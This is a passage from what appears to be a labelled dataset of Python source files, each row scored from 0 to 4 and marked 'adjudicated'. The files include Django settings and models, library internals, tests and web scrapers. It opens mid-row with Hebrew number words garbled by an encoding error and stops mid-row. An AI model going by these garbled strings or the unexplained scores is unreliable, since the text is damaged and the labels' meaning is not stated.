    ""×××© ×¢×©×¨×"",
    ""×©×©× ×¢×©×¨"",
    ""×©×© ×¢×©×¨×"",
    ""×©××¢× ×¢×©×¨"",
    ""×©××¢ ×¢×©×¨×"",
    ""×©××× × ×¢×©×¨"",
    ""×©××× × ×¢×©×¨×"",
    ""×ª×©×¢× ×¢×©×¨"",
    ""×ª×©×¢ ×¢×©×¨×"",
    ""×¢×©×¨××"",
    ""×©×××©××"",
    ""××¨××¢××"",
    ""××××©××"",
    ""×©××©××"",
    ""×©××¢××"",
    ""×©××× ××"",
    ""×ª×©×¢××"",
    ""×××"",
    ""×××£"",
    ""×××××"",
    ""×××××¨×"",
    ""××¨×××××"",
]


_ordinal_words = [
    ""×¨××©××"",
    ""×©× ×"",
    ""×©×××©×"",
    ""×¨×××¢×"",
    ""××××©×"",
    ""×©××©×"",
    ""×©×××¢×"",
    ""×©××× ×"",
    ""×ª×©××¢×"",
    ""×¢×©××¨×"",
]

def like_num(text):
    if text.startswith((""+"", ""-"", ""Â±"", ""~"")):
        text = text[1:]
    text = text.replace("","", """").replace(""."", """")
    if text.isdigit():
        return True

    if text.count(""/"") == 1:
        num, denom = text.split(""/"")
        if num.isdigit() and denom.isdigit():
            return True
    
    if text in _num_words:
        return True

    # CHeck ordinal number
    if text in _ordinal_words:
        return True
    return False


LEX_ATTRS = {LIKE_NUM: like_num}"
402	adjudicated	4	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = ""l, j F, Y""
TIME_FORMAT = ""h:i a""
DATETIME_FORMAT = ""j F, Y h:i a""
YEAR_MONTH_FORMAT = ""F, Y""
MONTH_DAY_FORMAT = ""j F""
SHORT_DATE_FORMAT = ""j.M.Y""
SHORT_DATETIME_FORMAT = ""j.M.Y H:i""
FIRST_DAY_OF_WEEK = 1  # (Monday)

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    ""%Y-%m-%d"",  # '2006-10-25'
    ""%m/%d/%Y"",  # '10/25/2006'
    ""%m/%d/%y"",  # '10/25/06'
    ""%d.%m.%Y"",  # '25.10.2006'
    ""%d.%m.%y"",  # '25.10.06'
    # ""%d %b %Y"",  # '25 Oct 2006'
    # ""%d %b, %Y"",  # '25 Oct, 2006'
    # ""%d %b. %Y"",  # '25 Oct. 2006'
    # ""%d %B %Y"",  # '25 October 2006'
    # ""%d %B, %Y"",  # '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    ""%Y-%m-%d %H:%M:%S"",  # '2006-10-25 14:30:59'
    ""%Y-%m-%d %H:%M:%S.%f"",  # '2006-10-25 14:30:59.000200'
    ""%Y-%m-%d %H:%M"",  # '2006-10-25 14:30'
    ""%d.%m.%Y %H:%M:%S"",  # '25.10.2006 14:30:59'
    ""%d.%m.%Y %H:%M:%S.%f"",  # '25.10.2006 14:30:59.000200'
    ""%d.%m.%Y %H:%M"",  # '25.10.2006 14:30'
    ""%d.%m.%y %H:%M:%S"",  # '25.10.06 14:30:59'
    ""%d.%m.%y %H:%M:%S.%f"",  # '25.10.06 14:30:59.000200'
    ""%d.%m.%y %H:%M"",  # '25.10.06 14:30'
    ""%m/%d/%Y %H:%M:%S"",  # '10/25/2006 14:30:59'
    ""%m/%d/%Y %H:%M:%S.%f"",  # '10/25/2006 14:30:59.000200'
    ""%m/%d/%Y %H:%M"",  # '10/25/2006 14:30'
    ""%m/%d/%y %H:%M:%S"",  # '10/25/06 14:30:59'
    ""%m/%d/%y %H:%M:%S.%f"",  # '10/25/06 14:30:59.000200'
    ""%m/%d/%y %H:%M"",  # '10/25/06 14:30'
]
DECIMAL_SEPARATOR = "".""
THOUSAND_SEPARATOR = "" ""
NUMBER_GROUPING = 3"
480	adjudicated	1	"""""""
Customized Mixin2to3 support:

 - adds support for converting doctests


This module raises an ImportError on Python 2.
""""""

from distutils.util import Mixin2to3 as _Mixin2to3
from distutils import log
from lib2to3.refactor import RefactoringTool, get_fixers_from_package

import setuptools


class DistutilsRefactoringTool(RefactoringTool):
    def log_error(self, msg, *args, **kw):
        log.error(msg, *args)

    def log_message(self, msg, *args):
        log.info(msg, *args)

    def log_debug(self, msg, *args):
        log.debug(msg, *args)


class Mixin2to3(_Mixin2to3):
    def run_2to3(self, files, doctests=False):
        # See of the distribution option has been set, otherwise check the
        # setuptools default.
        if self.distribution.use_2to3 is not True:
            return
        if not files:
            return
        log.info(""Fixing "" + "" "".join(files))
        self.__build_fixer_names()
        self.__exclude_fixers()
        if doctests:
            if setuptools.run_2to3_on_doctests:
                r = DistutilsRefactoringTool(self.fixer_names)
                r.refactor(files, write=True, doctests_only=True)
        else:
            _Mixin2to3.run_2to3(self, files)

    def __build_fixer_names(self):
        if self.fixer_names:
            return
        self.fixer_names = []
        for p in setuptools.lib2to3_fixer_packages:
            self.fixer_names.extend(get_fixers_from_package(p))
        if self.distribution.use_2to3_fixers is not None:
            for p in self.distribution.use_2to3_fixers:
                self.fixer_names.extend(get_fixers_from_package(p))

    def __exclude_fixers(self):
        excluded_fixers = getattr(self, 'exclude_fixers', [])
        if self.distribution.use_2to3_exclude_fixers is not None:
            excluded_fixers.extend(self.distribution.use_2to3_exclude_fixers)
        for fixer_name in excluded_fixers:
            if fixer_name in self.fixer_names:
                self.fixer_names.remove(fixer_name)"
422	adjudicated	3	"import importlib.metadata
from typing import Any, Optional, Protocol, cast


class BadMetadata(ValueError):
    def __init__(self, dist: importlib.metadata.Distribution, *, reason: str) -> None:
        self.dist = dist
        self.reason = reason

    def __str__(self) -> str:
        return f""Bad metadata in {self.dist} ({self.reason})""


class BasePath(Protocol):
    """"""A protocol that various path objects conform.

    This exists because importlib.metadata uses both ``pathlib.Path`` and
    ``zipfile.Path``, and we need a common base for type hints (Union does not
    work well since ``zipfile.Path`` is too new for our linter setup).

    This does not mean to be exhaustive, but only contains things that present
    in both classes *that we need*.
    """"""

    @property
    def name(self) -> str:
        raise NotImplementedError()

    @property
    def parent(self) -> ""BasePath"":
        raise NotImplementedError()


def get_info_location(d: importlib.metadata.Distribution) -> Optional[BasePath]:
    """"""Find the path to the distribution's metadata directory.

    HACK: This relies on importlib.metadata's private ``_path`` attribute. Not
    all distributions exist on disk, so importlib.metadata is correct to not
    expose the attribute as public. But pip's code base is old and not as clean,
    so we do this to avoid having to rewrite too many things. Hopefully we can
    eliminate this some day.
    """"""
    return getattr(d, ""_path"", None)


def get_dist_name(dist: importlib.metadata.Distribution) -> str:
    """"""Get the distribution's project name.

    The ``name`` attribute is only available in Python 3.10 or later. We are
    targeting exactly that, but Mypy does not know this.
    """"""
    name = cast(Any, dist).name
    if not isinstance(name, str):
        raise BadMetadata(dist, reason=""invalid metadata entry 'name'"")
    return name"
447	adjudicated	2	"import _plotly_utils.basevalidators


class LineValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""line"", parent_name=""scatterpolar"", **kwargs):
        super(LineValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Line""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            backoff
                Sets the line back off from the end point of
                the nth line segment (in px). This option is
                useful e.g. to avoid overlap with arrowhead
                markers. With ""auto"" the lines would trim
                before markers if `marker.angleref` is set to
                ""previous"".
            backoffsrc
                Sets the source reference on Chart Studio Cloud
                for `backoff`.
            color
                Sets the line color.
            dash
                Sets the dash style of lines. Set to a dash
                type string (""solid"", ""dot"", ""dash"",
                ""longdash"", ""dashdot"", or ""longdashdot"") or a
                dash length list in px (eg ""5px,10px,2px,2px"").
            shape
                Determines the line shape. With ""spline"" the
                lines are drawn using spline interpolation. The
                other available values correspond to step-wise
                line shapes.
            smoothing
                Has an effect only if `shape` is set to
                ""spline"" Sets the amount of smoothing. 0
                corresponds to no smoothing (equivalent to a
                ""linear"" shape).
            width
                Sets the line width (in px).
"""""",
            ),
            **kwargs,
        )"
416	adjudicated	0	"import pytest

from pandas import (
    DatetimeIndex,
    date_range,
)
import pandas._testing as tm


def astype_non_nano(dti_nano, unit):
    # TODO(2.0): remove once DTI/DTA.astype supports non-nano
    if unit == ""ns"":
        return dti_nano

    dta_nano = dti_nano._data
    arr_nano = dta_nano._ndarray

    arr = arr_nano.astype(f""M8[{unit}]"")
    if dti_nano.tz is None:
        dtype = arr.dtype
    else:
        dtype = type(dti_nano.dtype)(tz=dti_nano.tz, unit=unit)
    dta = type(dta_nano)._simple_new(arr, dtype=dtype)
    dti = DatetimeIndex(dta, name=dti_nano.name)
    assert dti.dtype == dtype
    return dti


@pytest.mark.filterwarnings(""ignore::DeprecationWarning"")
@pytest.mark.parametrize(""tz"", [None, ""Asia/Shanghai"", ""Europe/Berlin""])
@pytest.mark.parametrize(""name"", [None, ""my_dti""])
@pytest.mark.parametrize(""unit"", [""ns"", ""us"", ""ms"", ""s""])
def test_dti_snap(name, tz, unit):
    dti = DatetimeIndex(
        [
            ""1/1/2002"",
            ""1/2/2002"",
            ""1/3/2002"",
            ""1/4/2002"",
            ""1/5/2002"",
            ""1/6/2002"",
            ""1/7/2002"",
        ],
        name=name,
        tz=tz,
        freq=""D"",
    )
    dti = astype_non_nano(dti, unit)

    result = dti.snap(freq=""W-MON"")
    expected = date_range(""12/31/2001"", ""1/7/2002"", name=name, tz=tz, freq=""w-mon"")
    expected = expected.repeat([3, 4])
    expected = astype_non_nano(expected, unit)
    tm.assert_index_equal(result, expected)
    assert result.tz == expected.tz
    assert result.freq is None
    assert expected.freq is None

    result = dti.snap(freq=""B"")

    expected = date_range(""1/1/2002"", ""1/7/2002"", name=name, tz=tz, freq=""b"")
    expected = expected.repeat([1, 1, 1, 2, 2])
    expected = astype_non_nano(expected, unit)
    tm.assert_index_equal(result, expected)
    assert result.tz == expected.tz
    assert result.freq is None
    assert expected.freq is None"
218	adjudicated	0	"from django.db import models

# Create your models here.
class RTOadmin(models.Model):
    admin_id=models.AutoField(primary_key = True)
    admin_username=models.CharField(max_length=50)
    # authentication/forms.py
    admin_password = models.CharField(max_length=50)
    # desc=models.CharField(max_length=300)
    admin_created_date=models.DateField(auto_now_add=True)

    def __str__(self):
        return self.admin_username
    
class Vehicle(models.Model): 
    vehicle_id=models.AutoField(primary_key = True)
    vehicle_no=models.CharField(max_length=50,default=None)
    vehicle_own_name = models.CharField(max_length=50,default=None)
    vehicle_own_contact=models.IntegerField(default=None)
    vehicle_own_add=models.CharField(max_length=100,default=None)
    vehicle_own_email=models.CharField(max_length=50, default=None)
    vehicle_company_name=models.CharField(max_length=50,default=None)
    # vehicle_class=models.CharField(max_length=50,default=None)
    vehicle_date_reg=models.DateField(default=None)
    vehicle_chassics_no=models.CharField(max_length=30,default=None)
    vehicle_eng_no=models.CharField(max_length=30,default=None)
    vehicle_own_srno=models.IntegerField(default=None)
    vehicle_fuel_use=models.CharField(max_length=30,default=None)
    vehicle_Seat_cap=models.IntegerField(default=None)
    vehicle_model_name=models.CharField(max_length=50,default=None)
    vehicle_created_date=models.DateField(auto_now_add=True)  
    vehicle_last_login=models.CharField(max_length=30,default=None)

    def __str__(self):  
        return self.vehicle_no

class Rules(models.Model):
    rule_id=models.AutoField(primary_key= True)
    rule_code=models.CharField(max_length=50)
    rule_desc=models.CharField(max_length=100,blank=True)
    rule_sect = models.CharField(max_length=50,null=True)
    rule_pen=models.CharField(max_length=100,null=True)
    # rule_date=models.DateField(default=None)
    def __str__(self):  
        return self.rule_code"
189	adjudicated	3	"from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import csv
import time

url = ""https://u.gg/lol/tier-list""

options = Options()
options.add_argument(""--headless"") # Run Chrome in headless mode
service = Service(""chromedriver.exe"") # Path to your Chromedriver executable
driver = webdriver.Chrome(service=service, options=options)

driver.get(url)

file = open(""Tierlist.csv"", 'w')
writer = csv.writer(file)

wait = WebDriverWait(driver, 10)
wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, ""div.rt-tr-group"")))

champions = []
win_rates = []
pick_rates = []

writer.writerow(['Champion Name', 'Win rate', 'Pick Rate'])

while True:
    # Scroll to the bottom of the page
    driver.execute_script(""window.scrollTo(0, document.body.scrollHeight);"")
    time.sleep(1)
    
    # Scroll back to the top of the page
    driver.execute_script(""window.scrollTo(0, 0);"")
    time.sleep(1)
    
    # Check if all rows have been loaded
    rows = driver.find_elements(By.CSS_SELECTOR, ""div.rt-tr-group"")
    if len(rows) == len(champions):
        break
    
    # Otherwise, continue to extract the data
    for i in range(len(champions), len(rows)):
        row = rows[i]
        champion = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(3)"").get_attribute(""textContent"")
        win_rate = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(5)"").text.strip()
        pick_rate = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(6)"").text.strip()
            
        champions.append(champion)
        win_rates.append(win_rate)
        pick_rates.append(pick_rate)

        writer.writerow([champion, win_rate, pick_rate])

print(champions)
print(win_rates)
print(pick_rates)

driver.quit()"
358	adjudicated	1	"# Copyright 2017-present Adtran, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from voltha.adapters.adtran_onu.pon_port import PonPort
from mock import MagicMock
import pytest

## Test class PonPort init settings  ###############
def test_PonPort_inits():
    handler = MagicMock()
    handler.device_id = 100
    portnum = 1
    testponport = PonPort(handler, portnum)

    assert testponport._enabled is False
    assert testponport._valid is True
    assert testponport._handler is handler
    assert testponport._deferred is None
    assert testponport._port is None
    assert testponport._port_number == 1
    assert testponport._entity_id is None
    assert testponport._next_entity_id == PonPort.MIN_GEM_ENTITY_ID




## Test PonPort staticmethod #########
def test_create():
    handler = MagicMock()
    handler.device_id = 200
    port_no = 2
    testcreate = PonPort.create(handler, port_no)

    assert isinstance(testcreate, PonPort)
    assert testcreate._handler is handler
    assert testcreate._port_number is port_no





## Test PonPort @property #########
def test_PonPort_properties():
    handler = MagicMock()
    handler.device_id = 300
    port_no = 3
    testprop1 = PonPort(handler, port_no)

    assert testprop1.enabled is False
    assert testprop1.port_number == 3
    assert testprop1.entity_id is None
    assert testprop1.next_gem_entity_id == PonPort.MIN_GEM_ENTITY_ID
    assert testprop1.tconts == {}
    assert testprop1.gem_ports == {}

"
249	adjudicated	1	"from prowler.lib.check.models import Check, Check_Report_AWS
from prowler.providers.aws.services.directoryservice.directoryservice_client import (
    directoryservice_client,
)

SNAPSHOT_LIMIT_THRESHOLD = 2
""""""Number of remaining snapshots to reach the limit""""""


class directoryservice_directory_snapshots_limit(Check):
    def execute(self):
        findings = []
        for directory in directoryservice_client.directories.values():
            report = Check_Report_AWS(self.metadata())
            report.region = directory.region
            report.resource_id = directory.id
            if directory.snapshots_limits:
                if directory.snapshots_limits.manual_snapshots_limit_reached:
                    report.status = ""FAIL""
                    report.status_extended = f""Directory Service {directory.id} reached {directory.snapshots_limits.manual_snapshots_limit} Snapshots limit""
                else:
                    limit_remaining = (
                        directory.snapshots_limits.manual_snapshots_limit
                        - directory.snapshots_limits.manual_snapshots_current_count
                    )
                    if limit_remaining <= SNAPSHOT_LIMIT_THRESHOLD:
                        report.status = ""FAIL""
                        report.status_extended = f""Directory Service {directory.id} is about to reach {directory.snapshots_limits.manual_snapshots_limit} Snapshots which is the limit""
                    else:
                        report.status = ""PASS""
                        report.status_extended = f""Directory Service {directory.id} is using {directory.snapshots_limits.manual_snapshots_current_count} out of {directory.snapshots_limits.manual_snapshots_limit} from the Snapshots Limit""
                findings.append(report)

        return findings"
309	adjudicated	3	"from datetime import datetime
from .virtualtimescheduler import VirtualTimeScheduler


class HistoricalScheduler(VirtualTimeScheduler):
    """"""Provides a virtual time scheduler that uses datetime for absolute time
    and timedelta for relative time.""""""

    def __init__(self, initial_clock=None, comparer=None):
        """"""Creates a new historical scheduler with the specified initial clock
        value.

        Keyword arguments:
        initial_clock -- {Number} Initial value for the clock.
        comparer -- {Function} Comparer to determine causality of events based
            on absolute time.""""""

        def compare_datetimes(a, b):
            return (a > b) - (a < b)

        clock = initial_clock or datetime.fromtimestamp(0)
        comparer = comparer or compare_datetimes

        super(HistoricalScheduler, self).__init__(clock)

    @property
    def now(self):
        """"""Represents a notion of time for this scheduler. Tasks being scheduled
        on a scheduler will adhere to the time denoted by this property.""""""

        return self.clock

    @staticmethod
    def add(absolute, relative):
        """"""Adds a relative time value to an absolute time value.

        Keyword arguments:
        absolute -- {datetime} Absolute virtual time value.
        relative -- {timedelta} Relative virtual time value to add.

        Returns resulting absolute virtual time sum value.""""""

        return absolute + relative

    def to_datetime_offset(self, absolute):
        """"""Converts the absolute time value to a datetime value.""""""

        # datetime -> datetime
        return absolute

    def to_relative(self, timespan):
        """"""Converts the timespan value to a relative virtual time value.

        Keyword arguments:
        timespan -- {timedelta} Time_span value to convert.

        Returns corresponding relative virtual time value.""""""

        # timedelta -> timedelta
        return timespan"
98	adjudicated	1	"# -*- coding: utf-8 -*-

""""""
requests.compat
~~~~~~~~~~~~~~~

This module handles import compatibility issues between Python 2 and
Python 3.
""""""

import chardet

import sys

# -------
# Pythons
# -------

# Syntax sugar.
_ver = sys.version_info

#: Python 2.x?
is_py2 = (_ver[0] == 2)

#: Python 3.x?
is_py3 = (_ver[0] == 3)

try:
    import simplejson as json
except ImportError:
    import json

# ---------
# Specifics
# ---------

if is_py2:
    from urllib import (
        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,
        proxy_bypass, proxy_bypass_environment, getproxies_environment)
    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag
    from urllib2 import parse_http_list
    import cookielib
    from Cookie import Morsel
    from StringIO import StringIO
    # Keep OrderedDict for backwards compatibility.
    from collections import Callable, Mapping, MutableMapping, OrderedDict


    builtin_str = str
    bytes = str
    str = unicode
    basestring = basestring
    numeric_types = (int, long, float)
    integer_types = (int, long)

elif is_py3:
    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag
    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment
    from http import cookiejar as cookielib
    from http.cookies import Morsel
    from io import StringIO
    # Keep OrderedDict for backwards compatibility.
    from collections import OrderedDict
    from collections.abc import Callable, Mapping, MutableMapping

    builtin_str = str
    str = str
    bytes = bytes
    basestring = (str, bytes)
    numeric_types = (int, float)
    integer_types = (int,)"
88	adjudicated	3	"from MySQLdb.constants import FIELD_TYPE

from django.contrib.gis.gdal import OGRGeomType
from django.db.backends.mysql.introspection import DatabaseIntrospection


class MySQLIntrospection(DatabaseIntrospection):
    # Updating the data_types_reverse dictionary with the appropriate
    # type for Geometry fields.
    data_types_reverse = DatabaseIntrospection.data_types_reverse.copy()
    data_types_reverse[FIELD_TYPE.GEOMETRY] = ""GeometryField""

    def get_geometry_type(self, table_name, description):
        with self.connection.cursor() as cursor:
            # In order to get the specific geometry type of the field,
            # we introspect on the table definition using `DESCRIBE`.
            cursor.execute(""DESCRIBE %s"" % self.connection.ops.quote_name(table_name))
            # Increment over description info until we get to the geometry
            # column.
            for column, typ, null, key, default, extra in cursor.fetchall():
                if column == description.name:
                    # Using OGRGeomType to convert from OGC name to Django field.
                    # MySQL does not support 3D or SRIDs, so the field params
                    # are empty.
                    field_type = OGRGeomType(typ).django
                    field_params = {}
                    break
        return field_type, field_params

    def supports_spatial_index(self, cursor, table_name):
        # Supported with MyISAM/Aria, or InnoDB on MySQL 5.7.5+/MariaDB.
        storage_engine = self.get_storage_engine(cursor, table_name)
        if storage_engine == ""InnoDB"":
            if self.connection.mysql_is_mariadb:
                return True
            return self.connection.mysql_version >= (5, 7, 5)
        return storage_engine in (""MyISAM"", ""Aria"")"
319	adjudicated	1	"from django.contrib.sites.models import Site
from django.db import models
from django.urls import NoReverseMatch, get_script_prefix, reverse
from django.utils.encoding import iri_to_uri
from django.utils.translation import gettext_lazy as _


class FlatPage(models.Model):
    url = models.CharField(_(""URL""), max_length=100, db_index=True)
    title = models.CharField(_(""title""), max_length=200)
    content = models.TextField(_(""content""), blank=True)
    enable_comments = models.BooleanField(_(""enable comments""), default=False)
    template_name = models.CharField(
        _(""template name""),
        max_length=70,
        blank=True,
        help_text=_(
            ""Example: âflatpages/contact_page.htmlâ. If this isnât provided, ""
            ""the system will use âflatpages/default.htmlâ.""
        ),
    )
    registration_required = models.BooleanField(
        _(""registration required""),
        help_text=_(
            ""If this is checked, only logged-in users will be able to view the page.""
        ),
        default=False,
    )
    sites = models.ManyToManyField(Site, verbose_name=_(""sites""))

    class Meta:
        db_table = ""django_flatpage""
        verbose_name = _(""flat page"")
        verbose_name_plural = _(""flat pages"")
        ordering = [""url""]

    def __str__(self):
        return ""%s -- %s"" % (self.url, self.title)

    def get_absolute_url(self):
        from .views import flatpage

        for url in (self.url.lstrip(""/""), self.url):
            try:
                return reverse(flatpage, kwargs={""url"": url})
            except NoReverseMatch:
                pass
        # Handle script prefix manually because we bypass reverse()
        return iri_to_uri(get_script_prefix().rstrip(""/"") + self.url)"
259	adjudicated	4	"""""""tst_tc1357_uxusylnz_68580 URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/2.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
""""""

from django.contrib import admin
from django.urls import path, include, re_path
from django.views.generic.base import TemplateView
from allauth.account.views import confirm_email
from rest_framework import permissions
from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView

urlpatterns = [
    
    path(""accounts/"", include(""allauth.urls"")),
    path(""modules/"", include(""modules.urls"")),
    path(""api/v1/"", include(""home.api.v1.urls"")),
    path(""admin/"", admin.site.urls),
    path(""users/"", include(""users.urls"", namespace=""users"")),
    path(""rest-auth/"", include(""rest_auth.urls"")),
    # Override email confirm to use allauth's HTML view instead of rest_auth's API view
    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),
    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),
]

admin.site.site_header = ""TST-TC1357-uxusylnzzz""
admin.site.site_title = ""TST-TC1357-uxusylnzzz Admin Portal""
admin.site.index_title = ""TST-TC1357-uxusylnzzz Admin""

# swagger
urlpatterns += [
    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),
    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")
]


urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
348	adjudicated	3	"""""""
https://adventofcode.com/2016/day/15
""""""
from utils import extract_ints, read_data

USE_TEST_DATA = False
SPLIT_BY_LINE = True
data = read_data(USE_TEST_DATA, SPLIT_BY_LINE)


def parse_data(data_in):
    """""" Read the input data to retrieve the disc positions """"""
    num_positions = []
    starting_pos = []

    for line in data_in:
        ints = extract_ints(line)
        num_positions.append(ints[1])
        starting_pos.append(ints[3])

    return num_positions, starting_pos


def is_at_zero(num_positions, starting_pos, disc_index, time):
    """""" Is the specified disc at the zero position at the given time? """"""
    pos = (starting_pos[disc_index] + time) % num_positions[disc_index]
    return pos == 0


def find_time(num_positions, starting_pos):
    """"""
    Find the time at which to release a capsule so that it passes through all
    discs successfully
    """"""

    # What's the first time that we can release the disc where it reaches the
    # first disc as it's at position 0?
    candidate_time = num_positions[0] - starting_pos[0] - 1

    while True:
        # Are all discs at position 0 when the capsule reaches them?
        collision = False
        for disc_index in range(len(num_positions)):
            time_capsule_reaches_disc = candidate_time + disc_index + 1
            if not is_at_zero(num_positions, starting_pos, disc_index, time_capsule_reaches_disc):
                collision = True
                break

        # There was no collision with any disc! candidate_time is the correct answer!
        if not collision:
            return candidate_time

        # There was a collision so candidate_time isn't a valid result.
        # Increment it to the next time that disc 1 (index 0) is at the zero position.
        candidate_time += num_positions[0]


positions, starting = parse_data(data)

# Part 1
# At what time can we release the capsule to pass through all of the discs?
print(find_time(positions, starting))

# Part 2
# What if we add another disc at the bottom?
positions.append(11)
starting.append(0)
print(find_time(positions, starting))"
199	adjudicated	1	"# image_uri extractor
import requests
from bs4 import BeautifulSoup
import time

import json

api_url = 'http://127.0.0.1:3000/items'

# Get the current list of daily items from the API
response = requests.get(api_url)
items = response.json()

updated_count = 0
skipped_count = 0

last_attempted_item = 0

# Go through each item and update the image URI
for item in items:
    if item['id'] < 57722:
        continue
    if last_attempted_item is not None and item['id'] < last_attempted_item:
        continue
    if item['valid_status'] is True:
        skipped_count += 1
        continue
    while True:
        try:
            search_url = f""https://rl.insider.gg/en/pc/search?q={item['name'].replace(' ', '+')}""
            search_response = requests.get(search_url)
            search_html = search_response.text
            search_soup = BeautifulSoup(search_html, 'html.parser')
            search_items = search_soup.find_all('div', class_='item')
            for search_item in search_items:
                if search_item.find('span', class_='itemName').text.lower() == item['name'].lower():
                    img_uri = search_item['data-uri']
                    if ""import/import"" in img_uri:
                        img_uri = img_uri.replace(""import/import"", ""import"")
                    item['image_uri'] = img_uri
                    patch_response = requests.patch(api_url+'/'+str(item['id']), json={'image_uri': img_uri})
                    print(f""{item['id']} Image URI updated"")
                    updated_count += 1
                    break
            else:
                print(f""{item['id']} No image URI found"")
                skipped_count += 1
            last_attempted_item = item['id']
            break
        except Exception as e:
            print(f""Error updating item {item['id']}: {e}"")
            print(f""Retrying in 5 minutes..."")
            time.sleep(5 * 60)
            continue

print(f""Updated {updated_count} items"")
print(f""Skipped {skipped_count} items"")"
208	adjudicated	4	"""""""tst_tc751_ckuayzoqs_68554 URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/2.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
""""""

from django.contrib import admin
from django.urls import path, include, re_path
from django.views.generic.base import TemplateView
from allauth.account.views import confirm_email
from rest_framework import permissions
from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView

urlpatterns = [
    
    path(""accounts/"", include(""allauth.urls"")),
    path(""modules/"", include(""modules.urls"")),
    path(""api/v1/"", include(""home.api.v1.urls"")),
    path(""admin/"", admin.site.urls),
    path(""users/"", include(""users.urls"", namespace=""users"")),
    path(""rest-auth/"", include(""rest_auth.urls"")),
    # Override email confirm to use allauth's HTML view instead of rest_auth's API view
    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),
    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),
]

admin.site.site_header = ""TST-TC751-ckuayzoqsc""
admin.site.site_title = ""TST-TC751-ckuayzoqsc Admin Portal""
admin.site.index_title = ""TST-TC751-ckuayzoqsc Admin""

# swagger
urlpatterns += [
    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),
    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")
]


urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
406	adjudicated	2	"""""""
This module deals with interpreting the parse tree as Python
would have done, in the compiler.

For now this only covers parse tree to value conversion of
compile-time values.
""""""

from __future__ import absolute_import

from .Nodes import *
from .ExprNodes import *
from .Errors import CompileError


class EmptyScope(object):
    def lookup(self, name):
        return None

empty_scope = EmptyScope()

def interpret_compiletime_options(optlist, optdict, type_env=None, type_args=()):
    """"""
    Tries to interpret a list of compile time option nodes.
    The result will be a tuple (optlist, optdict) but where
    all expression nodes have been interpreted. The result is
    in the form of tuples (value, pos).

    optlist is a list of nodes, while optdict is a DictNode (the
    result optdict is a dict)

    If type_env is set, all type nodes will be analysed and the resulting
    type set. Otherwise only interpretateable ExprNodes
    are allowed, other nodes raises errors.

    A CompileError will be raised if there are problems.
    """"""

    def interpret(node, ix):
        if ix in type_args:
            if type_env:
                type = node.analyse_as_type(type_env)
                if not type:
                    raise CompileError(node.pos, ""Invalid type."")
                return (type, node.pos)
            else:
                raise CompileError(node.pos, ""Type not allowed here."")
        else:
            if (sys.version_info[0] >=3 and
                isinstance(node, StringNode) and
                node.unicode_value is not None):
                return (node.unicode_value, node.pos)
            return (node.compile_time_value(empty_scope), node.pos)

    if optlist:
        optlist = [interpret(x, ix) for ix, x in enumerate(optlist)]
    if optdict:
        assert isinstance(optdict, DictNode)
        new_optdict = {}
        for item in optdict.key_value_pairs:
            new_key, dummy = interpret(item.key, None)
            new_optdict[new_key] = interpret(item.value, item.key.value)
        optdict = new_optdict
    return (optlist, new_optdict)"
457	adjudicated	4	"""""""
String utility functions.
""""""

from typing import Any, Optional, Union


def safe_repr(obj: Any, clip: Optional[int] = None) -> str:
    """"""
